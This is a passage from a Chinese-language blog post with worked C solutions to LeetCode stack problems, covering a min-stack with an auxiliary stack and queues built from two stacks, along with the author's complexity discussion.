nums2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(top!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        table[<span class="built_in">stack</span>[top]+<span class="built_in">max</span>] = <span class="number">-1</span>;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *arr = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*nums1Size);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums1Size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i]=table[nums1[i]+<span class="built_in">max</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = nums1Size;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，由于我们所使用的映射表的大小取的是元素中绝对值最大的那一个作为大小，所以内存上会很吃亏，<strong>对于数值比较大的数据还是选择最初的解法</strong></p><p><img src="https://i.loli.net/2020/09/06/gqZYICv2Uj6TLwA.png" alt="image.png"></p><h2 id="0x03-栈的最小值"><a href="#0x03-栈的最小值" class="headerlink" title="0x03.栈的最小值"></a>0x03.<a href="https://leetcode-cn.com/problems/min-stack-lcci" target="_blank" rel="noopener">栈的最小值</a></h2><blockquote><p>请设计一个栈，除了常规栈支持的pop与push函数以外，还支持min函数，该函数返回栈元素中的最小值。执行push、pop和min操作的时间复杂度必须为O(1)。</p><p>示例：</p><p>MinStack minStack = new MinStack();<br>minStack.push(-2);<br>minStack.push(0);<br>minStack.push(-3);<br>minStack.getMin();   –&gt; 返回 -3.<br>minStack.pop();<br>minStack.top();      –&gt; 返回 0.<br>minStack.getMin();   –&gt; 返回 -2.</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/min-stack-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/min-stack-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>大框架都给出来了，四舍五入相当于模板题</p><p>老链表人直接构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125; MinStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** initialize your data structure here. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">MinStack* <span class="title">minStackCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * <span class="built_in">stack</span> = (MinStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MinStack));</span><br><span class="line">    <span class="built_in">stack</span>-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minStackPush</span><span class="params">(MinStack* obj, <span class="keyword">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * <span class="built_in">stack</span> = (MinStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MinStack));</span><br><span class="line">    <span class="built_in">stack</span>-&gt;value = obj-&gt;value;</span><br><span class="line">    <span class="built_in">stack</span>-&gt;next = obj-&gt;next;</span><br><span class="line">    obj-&gt;value = x;</span><br><span class="line">    obj-&gt;next = <span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minStackPop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    obj-&gt;value = obj-&gt;next-&gt;value;</span><br><span class="line">    obj-&gt;next = obj-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minStackTop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minStackGetMin</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">min</span> = obj-&gt;value;</span><br><span class="line">    obj = obj-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">min</span> = <span class="built_in">min</span>&lt;obj-&gt;value?<span class="built_in">min</span>:obj-&gt;value;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minStackFree</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack* temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = minStackCreate();</span></span><br><span class="line"><span class="comment"> * minStackPush(obj, x);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackPop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = minStackTop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_4 = minStackGetMin(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>看得出来似乎时间复杂度太高了些，问题出在哪呢？</p><p><img src="https://i.loli.net/2020/09/06/sbTDOJEnf4x8vg6.png" alt="image.png"></p><p>重新读一遍题目我们可以发现一个特殊的要求——<strong>push、pop、min的时间复杂度必须为O(1)</strong>，而我们遍历一遍栈检索最小值的过程的时间复杂度<strong>至少是O(N)</strong></p><p>那么我们该如何优化呢？答案是<strong>使用另外一个栈来保存最小值</strong>，每当遇到比最小值小的元素入栈时将之也入最小值栈，该元素出栈时最小值栈也出栈，在需要取栈最小值时<strong>直接取该最小值栈的栈顶</strong>即可</p><p>故构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125; MinStack;</span><br><span class="line">MinStack *min_stack;</span><br><span class="line"><span class="comment">/** initialize your data structure here. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">MinStack* <span class="title">minStackCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * <span class="built_in">stack</span> = (MinStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MinStack));</span><br><span class="line">    min_stack = (MinStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MinStack));</span><br><span class="line">    <span class="built_in">stack</span>-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    min_stack-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minStackPush</span><span class="params">(MinStack* obj, <span class="keyword">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * <span class="built_in">stack</span> = (MinStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MinStack));</span><br><span class="line">    <span class="built_in">stack</span>-&gt;value = obj-&gt;value;</span><br><span class="line">    <span class="built_in">stack</span>-&gt;next = obj-&gt;next;</span><br><span class="line">    obj-&gt;value = x;</span><br><span class="line">    obj-&gt;next = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="keyword">if</span>(min_stack-&gt;next==<span class="literal">NULL</span>||x&lt;=min_stack-&gt;value)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">stack</span> = (MinStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MinStack));</span><br><span class="line">        <span class="built_in">stack</span>-&gt;value = min_stack-&gt;value;</span><br><span class="line">        <span class="built_in">stack</span>-&gt;next = min_stack-&gt;next;</span><br><span class="line">        min_stack-&gt;value = x;</span><br><span class="line">        min_stack-&gt;next = <span class="built_in">stack</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minStackPop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;value == min_stack-&gt;value&amp;&amp;min_stack-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        min_stack-&gt;value = min_stack-&gt;next-&gt;value;</span><br><span class="line">        min_stack-&gt;next = min_stack-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;value = obj-&gt;next-&gt;value;</span><br><span class="line">    obj-&gt;next = obj-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minStackTop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minStackGetMin</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> min_stack-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minStackFree</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack* temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(min_stack-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = min_stack;</span><br><span class="line">        min_stack = min_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = minStackCreate();</span></span><br><span class="line"><span class="comment"> * minStackPush(obj, x);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackPop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = minStackTop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_4 = minStackGetMin(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/IJsPh9ElX8fWTum.png" alt="image.png"></p><h2 id="0x04-化栈为队"><a href="#0x04-化栈为队" class="headerlink" title="0x04.化栈为队"></a>0x04.<a href="https://leetcode-cn.com/problems/implement-queue-using-stacks-lcci" target="_blank" rel="noopener">化栈为队</a></h2><blockquote><p>实现一个MyQueue类，该类用两个栈来实现一个队列。</p><p>示例：</p><p>MyQueue queue = new MyQueue();</p><p>queue.push(1);<br>queue.push(2);<br>queue.peek();  // 返回 1<br>queue.pop();   // 返回 1<br>queue.empty(); // 返回 false</p><p>说明：</p><p>你只能使用标准的栈操作 – 也就是只有 push to top, peek/pop from top, size 和 is empty 操作是合法的。<br>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。<br>假设所有操作都是有效的 （例如，一个空的队列不会调用 pop 或者 peek 操作）。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/implement-queue-using-stacks-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/implement-queue-using-stacks-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>据说是一道面试题（<del>当然究竟面试会不会考这么简单的题我暂且蒙在古里</del></p><p>题目要求<strong>用两个栈</strong>来模拟一个队列，我们不难想到可以使一个栈<code>in_stack</code>负责处理push的元素，一个栈<code>out_stack</code>负责处理pop的元素</p><p>当元素需要出队时：</p><ul><li>检查out_stack是否为空</li><li>若out_stack为空则将in_stack中元素逐一出栈并逐一入out_stack栈中，<strong>完成逆序栈构造</strong></li><li>将out_stack栈顶元素pop</li></ul><p>故构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Stack * in_stack;</span><br><span class="line">    Stack * out_stack;</span><br><span class="line">&#125; MyQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">MyQueue* <span class="title">myQueueCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MyQueue * myQueue = (MyQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyQueue));</span><br><span class="line">    myQueue-&gt;in_stack = <span class="literal">NULL</span>;</span><br><span class="line">    myQueue-&gt;out_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> myQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myQueuePush</span><span class="params">(MyQueue* obj, <span class="keyword">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack *s = (Stack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">    s-&gt;value = x;</span><br><span class="line">    s-&gt;next = obj-&gt;in_stack;</span><br><span class="line">    obj-&gt;in_stack = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myQueuePop</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack * temp;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;out_stack == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = obj-&gt;out_stack;</span><br><span class="line">            obj-&gt;out_stack = obj-&gt;in_stack;</span><br><span class="line">            obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">            obj-&gt;out_stack-&gt;next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n = obj-&gt;out_stack-&gt;value;</span><br><span class="line">    temp = obj-&gt;out_stack;</span><br><span class="line">    obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Get the front element. */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myQueuePeek</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack * temp;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;out_stack == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = obj-&gt;out_stack;</span><br><span class="line">            obj-&gt;out_stack = obj-&gt;in_stack;</span><br><span class="line">            obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">            obj-&gt;out_stack-&gt;next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;out_stack-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">myQueueEmpty</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>||obj-&gt;out_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myQueueFree</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack*temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;in_stack;</span><br><span class="line">        obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;out_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;out_stack;</span><br><span class="line">        obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = myQueueCreate();</span></span><br><span class="line"><span class="comment"> * myQueuePush(obj, x);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_2 = myQueuePop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = myQueuePeek(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * bool param_4 = myQueueEmpty(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * myQueueFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/y3brkdqxl6FYhjO.png" alt="image.png"></p><h2 id="0x05-剑指-Offer-09-用两个栈实现队列"><a href="#0x05-剑指-Offer-09-用两个栈实现队列" class="headerlink" title="0x05.剑指 Offer 09. 用两个栈实现队列"></a>0x05.<a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/" target="_blank" rel="noopener">剑指 Offer 09. 用两个栈实现队列</a></h2><blockquote><p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p><p>示例 1：</p><p>输入：<br>[“CQueue”,”appendTail”,”deleteHead”,”deleteHead”]<br>[[],[3],[],[]]<br>输出：[null,null,3,-1]<br>示例 2：</p><p>输入：<br>[“CQueue”,”deleteHead”,”appendTail”,”appendTail”,”deleteHead”,”deleteHead”]<br>[[],[],[5],[2],[],[]]<br>输出：[null,-1,null,null,5,2]<br>提示：</p><p>1 &lt;= values &lt;= 10000<br>最多会对 appendTail、deleteHead 进行 10000 次调用</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>和这道题几乎一样的题（<del>这种题都能上剑指offer么，蒟蒻OIer暂且蒙在古里</del>），这一次给定了大小，为了省事我们选择使用数组来模拟栈</p><p>构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 